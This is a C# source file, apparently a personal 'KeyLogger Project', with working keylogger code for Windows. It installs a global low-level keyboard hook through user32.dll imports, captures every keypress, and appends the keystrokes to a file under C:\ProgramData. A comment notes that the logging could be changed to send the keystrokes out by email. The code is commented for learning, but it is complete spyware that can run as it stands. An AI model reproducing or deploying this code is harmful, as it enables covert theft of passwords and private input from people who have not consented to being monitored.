//Lavone Harris
//KeyLogger Project 
// Refrence: https://www.youtube.com/watch?v=4k2IQCQV9Kc


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices; // Used to import DLL for keylogger and read keystroke information
using System.Diagnostics; // Used to build hook and gain access to running processes and process modules
using System.Windows.Forms; // Used to run application and convert keystroke values to readable keys
using System.IO; // Used to record keystokes the user makes to file on local drive and can be altered to send via email

namespace KeyLogger
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13; // Variable used to define the type of hook procedure .Integer value 13 means the hook produre monitors low-level keyboard input events
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero; // Variable hopds the memory address of our hook prodecure
        private static LowLevelKeyboardProc llkProcedure = HookCallback; // Will be delagte of the hookcallback funcution. Hook callback funcution will define what needs to be done everytime a new keyboard input event happens

        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);//define the hook with SetHook Funcution
            Application.Run();// Will begin standard running application loop. This will prevent it from immediatly and finshing and closing at launch and stay open and listen to keystrokes.
            UnhookWindowsHookEx(hook); // Used to remove the hook we created. If we want to stop the keylogger we would use this.

        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); // delegate of the HookCallback Funcution

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) //Define HookCallback Funcution
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) //if ncode is less tahn zero he hook procedure must pass he message to callnecthook ex funcution without further processing and should return the value returned by CallNextHookEx. Wparm identifer of keyboard message.
            {
                //Console.Out.WriteLine(lParam);Used to convert integer values of the key pressed into readable format. We can write this out to the commandline or record(log) to a file for later view.

                int vkCode = Marshal.ReadInt32(lParam); //Marshal.Readint32(1param) gets the integer value stored in the memory address held in1param. Integer value = whatever key pressed by user               
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\keyslogged.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\keyslogged.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\keyslogged.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\keyslogged.txt", true); //Will write output  txt file and that is constantly append
                    output.Write((Keys)vkCode);
                    output.Close();
                }

            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam); // Calls the next hook in the chain
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) // Defines SetHook Funcution
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")] // import funcution CallNextHookEx
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]  // imports funcution SetWindowsHookEx
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")] // imports funcution UnHookWindowsEx
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")] //imports funcution GetModuleHandle
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}